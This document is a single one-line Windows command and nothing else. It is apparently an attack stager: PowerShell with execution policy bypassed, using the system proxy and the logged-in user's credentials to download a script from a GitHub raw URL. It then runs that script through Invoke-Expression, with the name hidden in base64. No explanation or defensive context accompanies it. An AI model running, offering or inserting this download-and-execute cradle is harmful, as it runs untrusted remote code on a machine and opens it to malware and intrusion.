cmd /c powershell -exec bypass "$req=new-object net.webclient;$req.proxy=[Net.WebRequest]::GetSystemWebProxy();$req.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$res=$req.DownloadString('https://raw.githubusercontent.com/TomZacLee/ziizii/main/asp.php');&([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('SUVY'))) $res;"
